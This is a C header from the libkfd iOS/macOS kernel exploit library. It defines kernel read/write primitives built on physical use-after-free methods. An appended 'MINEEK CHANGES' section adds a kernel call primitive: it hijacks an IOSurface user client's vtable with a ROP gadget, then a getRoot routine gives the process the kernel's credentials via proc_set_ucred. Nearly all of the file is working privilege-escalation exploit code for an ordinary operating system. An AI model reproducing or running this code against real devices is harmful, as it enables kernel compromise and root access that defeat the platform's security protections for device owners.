/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
    kread_IOSurface,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
    kwrite_IOSurface,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        bool ios;
        char osversion[8];
        u64 maxfilesperproc;
    } env;
    struct {
        u64 kernel_slide;
        u64 gVirtBase;
        u64 gPhysBase;
        u64 gPhysSize;
        struct {
            u64 pa;
            u64 va;
        } ttbr[2];
        struct ptov_table_entry {
            u64 pa;
            u64 va;
            u64 len;
        } ptov_table[8];

        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kernel;
};

struct perf {
    u64 kernelcache_index;
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_IOSurface);
    assert(kwrite_method <= kwrite_IOSurface);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

// BEGIN MINEEK CHANGES
#include "IOKit.h"
#include "mineekpf.h"
#include "offsetcache.h"

mach_port_t user_client;
uint64_t fake_client;

uint64_t add_x0_x0_0x40_ret_func = 0;
uint64_t proc_set_ucred_func = 0;

uint32_t kread32(u64 kfd, uint64_t where) {
    uint32_t out;
    kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}

uint64_t kread64(u64 kfd, uint64_t where) {
    uint64_t out;
    kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite32(u64 kfd, uint64_t where, uint32_t what)
{
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(kfd, where+4);
    kwrite(kfd, &_buf, where, sizeof(u64));
}

void kwrite64(u64 kfd, uint64_t where, uint64_t what)
{
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite(kfd, &_buf, where, sizeof(u64));
}

uint64_t find_port(u64 kfd, mach_port_name_t port){
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t task_addr = kfd_struct->info.kernel.current_task;
    uint64_t itk_space = kread64(kfd, task_addr + 0x308);
    uint64_t is_table = kread64(kfd, itk_space + 0x20);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = kread64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
uint64_t dirty_kalloc(u64 kfd, size_t size) {
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t begin = kfd_struct->info.kernel.kernel_proc;
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = kread32(kfd, addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                break;
            }
        }
        if (found) {
            printf("[+] dirty_kalloc: 0x%llx\n", addr);
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        printf("[-] failed to find free space in kernel\n");
        exit(EXIT_FAILURE);
    }
    return 0;
}

void init_kcall(u64 kfd) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = find_port(kfd, user_client);
    printf("Found port: 0x%llx\n", uc_port);
    uint64_t uc_addr = kread64(kfd, uc_port + 0x48);
    printf("Found addr: 0x%llx\n", uc_addr);
    uint64_t uc_vtab = kread64(kfd, uc_addr);
    printf("Found vtab: 0x%llx\n", uc_vtab);
    uint64_t fake_vtable = dirty_kalloc(kfd, 0x1000);
    printf("Created fake_vtable at %016llx\n", fake_vtable);
    for (int i = 0; i < 0x200; i++) {
        kwrite64(kfd, fake_vtable+i*8, kread64(kfd, uc_vtab+i*8));
    }
    printf("Copied some of the vtable over\n");
    fake_client = dirty_kalloc(kfd, 0x2000);
    printf("Created fake_client at %016llx\n", fake_client);
    for (int i = 0; i < 0x200; i++) {
        kwrite64(kfd, fake_client+i*8, kread64(kfd, uc_addr+i*8));
    }
    printf("Copied the user client over\n");
    kwrite64(kfd, fake_client, fake_vtable);
    kwrite64(kfd, uc_port + 0x48, fake_client);
    kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
}

uint64_t kcall(u64 kfd, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(kfd, fake_client+0x40);
    uint64_t offx28 = kread64(kfd, fake_client+0x48);
    kwrite64(kfd, fake_client+0x40, x0);
    kwrite64(kfd, fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(kfd, fake_client+0x40, offx20);
    kwrite64(kfd, fake_client+0x48, offx28);
    return returnval;
}

uint64_t proc_of_pid(u64 kfd, pid_t pid)
{
    uint64_t proc = ((struct kfd*)kfd)->info.kernel.kernel_proc;
    while (proc != 0) {
        uint64_t pidptr = proc + 0x68;
        uint32_t pid2 = kread32(kfd, pidptr);
        char name[32];
        kread(kfd, proc + 0x381, &name, 32);
        printf("FOUND: pid %d, name %s\n", pid2, name);
        if(pid2 == pid) {
            printf("GOT IT\n");
            return proc;
        }
        proc = kread64(kfd, proc + 0x8);
    }
    return 0;
}

void getRoot(u64 kfd, uint64_t proc_addr)
{
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t self_ro = kread64(kfd, proc_addr + 0x20);
    printf("self_ro @ 0x%llx\n", self_ro);
    uint64_t self_ucred = kread64(kfd, self_ro + 0x20);
    printf("ucred @ 0x%llx\n", self_ucred);
    printf("test_uid = %d\n", getuid());

    uint64_t kernproc = proc_of_pid(kfd, 1);
    printf("kern proc @ %llx\n", kernproc);
    uint64_t kern_ro = kread64(kfd, kernproc + 0x20);
    printf("kern_ro @ 0x%llx\n", kern_ro);
    uint64_t kern_ucred = kread64(kfd, kern_ro + 0x20);
    printf("kern_ucred @ 0x%llx\n", kern_ucred);

    // use proc_set_ucred to set kernel ucred.
    kcall(kfd, proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
    setuid(0);
    setuid(0);
    printf("getuid: %d\n", getuid());
}

void stage2(u64 kfd)
{
    struct kfd* kfd_struct = (struct kfd*)kfd;
    printf("patchfinding!\n");
    init_kernel(kfd_struct);
    add_x0_x0_0x40_ret_func = getOffset(0);
    if (add_x0_x0_0x40_ret_func == 0) {
        printf("[-] add_x0_x0_0x40_ret_func not in cache, patchfinding\n");
        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
    } else {
        printf("[+] add_x0_x0_0x40_ret_func in cache\n");
        add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
    }
    printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
    assert(add_x0_x0_0x40_ret_func != 0);
    proc_set_ucred_func = getOffset(1);
    if (proc_set_ucred_func == 0) {
        printf("[-] proc_set_ucred_func not in cache, patchfinding\n");
        proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
        setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
    } else {
        printf("[+] proc_set_ucred_func in cache\n");
        proc_set_ucred_func += kfd_struct->info.kernel.kernel_slide;
    }
    printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
    assert(proc_set_ucred_func != 0);
    printf("patchfinding complete!\n");
    pid_t pid = getpid();
    printf("pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(kfd, getpid());
    printf("proc_addr @ 0x%llx\n", proc_addr);
    printf("init_kcall!\n");
    init_kcall(kfd);
    printf("getRoot!\n");
    getRoot(kfd, proc_addr);
}

uint64_t kernel_slide(uint64_t kfd)
{
    return ((struct kfd*)kfd)->info.kernel.kernel_slide;
}

#endif /* libkfd_h */
